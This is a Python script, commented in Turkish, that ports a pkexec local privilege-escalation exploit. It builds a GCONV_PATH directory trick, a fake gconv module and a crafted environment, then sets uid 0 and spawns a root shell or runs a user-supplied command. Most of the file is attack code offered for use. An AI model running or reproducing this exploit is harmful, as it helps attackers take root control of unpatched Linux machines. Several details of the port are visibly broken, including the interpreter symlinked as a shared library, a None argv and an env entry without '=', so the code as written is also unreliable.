import os
import stat
import shutil
import subprocess

def unlink_cb(fpath):
    try:
        if os.path.isdir(fpath) and not os.path.islink(fpath):
            shutil.rmtree(fpath)
        else:
            os.remove(fpath)
    except Exception as e:
        print(f"[-] Failed to remove {fpath}: {e}")

def rmrf(path):
    if os.path.exists(path):
        for root, dirs, files in os.walk(path, topdown=False):
            for name in files:
                unlink_cb(os.path.join(root, name))
            for name in dirs:
                unlink_cb(os.path.join(root, name))
        unlink_cb(path)

def entry():
    try:
        os.mkdir("GCONV_PATH=.", 0o777)
    except FileExistsError:
        pass
    except Exception as e:
        print("Failed to create directory:", e)
        os._exit(1)

    try:
        os.mknod("GCONV_PATH=./.pkexec", stat.S_IFREG | 0o777)
    except FileExistsError:
        pass

    try:
        os.mkdir(".pkexec", 0o777)
    except FileExistsError:
        pass

    try:
        with open(".pkexec/gconv-modules", "w") as fp:
            fp.write("module UTF-8// PKEXEC// pkexec 2")
    except Exception as e:
        print("Failed to write config:", e)
        os._exit(1)

    try:
        buf = os.readlink("/proc/self/exe")
        os.symlink(buf, ".pkexec/pkexec.so")
    except FileExistsError:
        pass
    except Exception as e:
        print("Failed to create symlink:", e)
        os._exit(1)

    rpipe, wpipe = os.pipe()

    pid = os.fork()
    if pid == 0:
        os.close(wpipe)
        output = os.read(rpipe, 1024).decode(errors='ignore')
        if output.startswith("pkexec --version"):
            print("Exploit failed. Target is most likely patched.")
            rmrf("GCONV_PATH=.")
            rmrf(".pkexec")
        os._exit(0)

    os.close(rpipe)
    os.dup2(wpipe, 2)
    os.close(wpipe)

    cmd = None
    # rbp taklidi Python'da gerekmez, doğrudan argüman alınabilir
    # ama C'deki mantığı sürdürüyoruz
    if len(os.sys.argv) > 1:
        cmd = "CMD=" + os.sys.argv[1]

    args = [None]
    env = [
        ".pkexec",
        "PATH=GCONV_PATH=.",
        "CHARSET=pkexec",
        "SHELL=pkexec"
    ]
    if cmd:
        env.append(cmd)

    try:
        os.execve("/usr/bin/pkexec", args, dict(e.split("=", 1) for e in env))
    except FileNotFoundError:
        os.execvpe("pkexec", args, dict(e.split("=", 1) for e in env))

    os._exit(0)

def gconv():
    pass

def gconv_init():
    try:
        os.close(2)
        os.dup2(1, 2)
    except Exception:
        pass

    cmd = os.getenv("CMD")

    try:
        os.setresuid(0, 0, 0)
        os.setresgid(0, 0, 0)
    except AttributeError:
        # Python on some systems may not support setresuid/setresgid
        os.setuid(0)
        os.setgid(0)

    rmrf("GCONV_PATH=.")
    rmrf(".pkexec")

    if cmd:
        os.execve("/bin/sh", ["/bin/sh", "-c", cmd], os.environ)
    else:
        try:
            os.execve("/bin/bash", ["-i"], os.environ)
        except:
            os.execve("/bin/sh", ["/bin/sh"], os.environ)

    os._exit(0)

# Python'da direkt `entry()` çağırmak yeterlidir
if __name__ == "__main__":
    entry()
